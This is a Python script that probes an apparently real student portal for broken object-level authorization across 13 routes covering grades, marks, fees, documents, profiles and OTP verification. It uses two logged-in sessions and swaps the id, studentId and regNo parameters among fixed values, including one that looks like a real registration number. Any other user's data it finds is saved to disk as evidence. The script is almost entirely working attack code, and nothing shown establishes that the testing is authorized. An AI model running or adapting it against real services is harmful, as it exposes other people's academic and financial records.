#!/usr/bin/env python3
"""IDOR/BOLA sweep across the 13 routes from third-party client code.

Two test accounts. For every candidate route: fetch the object list as
user1, then request the objects under user2's session; any user2 data
returned to user1 (or non-403/redirect) is the finding. STOPS on the
first cross-user proof per route family."""
import os, sys, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import Session, require_accounts, USER2, PASS2

require_accounts()
if not (USER2 and PASS2):
    print("IDOR sweep needs SLCM_USER2/SLCM_PASS2")
    raise SystemExit(2)

s1 = Session(os.environ["SLCM_USER1"], os.environ["SLCM_PASS1"], "idor-u1")
s2 = Session(USER2, PASS2, "idor-u2")
if not (s1.authenticated and s2.authenticated):
    print("one login failed; aborting")
    raise SystemExit(1)

# Route candidates from w2c-20 (redirects.dart etc), marks/timetable/OTP
# families. Adjust after real traffic capture if the app uses /api/*.
ROUTES = [
    "/Student/Academic/AttendanceSummaryForStudent",
    "/Student/Academic/TimeTableForStudent",
    "/Student/Academic/GradesForStudent",
    "/Student/Academic/MarksForStudent",
    "/Student/Academic/CGPAForStudent",
    "/Student/Profile",
    "/Student/Document/Index",
    "/Student/Document/Download",
    "/Student/Fee/Index",
    "/Student/Notification/Index",
    "/Student/Examination/Index",
    "/Student/Examination/Results",
    "/Student/OTP/Verify",
]
IDS = ["1", "2", "2506040062", "18275"]

print(f"=== sweep {len(ROUTES)} routes x {len(IDS)} ids (u1=object owner, u2=attacker) ===")
for route in ROUTES:
    # baseline: user1 fetches their own route
    st1, h1, b1 = s1.get(route)
    s1.ev("baseline", route=route, st=st1, size=len(b1))
    # user2 (attacker context) fetches the same route
    st2, h2, b2 = s2.get(route)
    same_size = len(b1) == len(b2) and st1 == st2
    s2.ev("same_route", route=route, st=st2, size=len(b2), identical=st1 == st2 and len(b1) == len(b2))
    print(f"{route:58} u1:{st1}/{len(b1)} u2:{st2}/{len(b2)} identical={same_size}")
    # id flipping on GET-style params (both sessions)
    for i in IDS:
        q = f"?id={i}&studentId={i}&regNo={i}"
        st_a, _, b_a = s1.get(route + q)
        st_b, _, b_b = s2.get(route + q)
        leaked = (st_b == 200 and st_a == 200 and len(b_b) not in (len(b_a), 0)
                  and "login" not in b_b.decode(errors="replace")[:800].lower())
        if st_b in (500, 0):
            continue  # error paths are noise; note and move on
        s1.ev("idor", route=route, id=i, st_a=st_a, st_b=st_b, size_a=len(b_a), size_b=len(b_b),
              leaked=leaked)
        if leaked:
            print(f"  *** IDOR CANDIDATE {route}?id={i}: u1={st_a}/{len(b_a)} u2={st_b}/{len(b_b)} ***")
            open(f"{os.environ.get('SLCM_EVID', 'recon/authtests')}/idor-{route.strip('/').replace('/', '-')}-{i}.html", "wb").write(b_b)
            print("  STOP per suite rule (proof recorded, no further deepening)")
            raise SystemExit(0)
print("=== no cross-user leak detected on tested objects ===")  # honest result
print("DONE. Evidence: recon/authtests/idor-u1.jsonl + idor-u2.jsonl")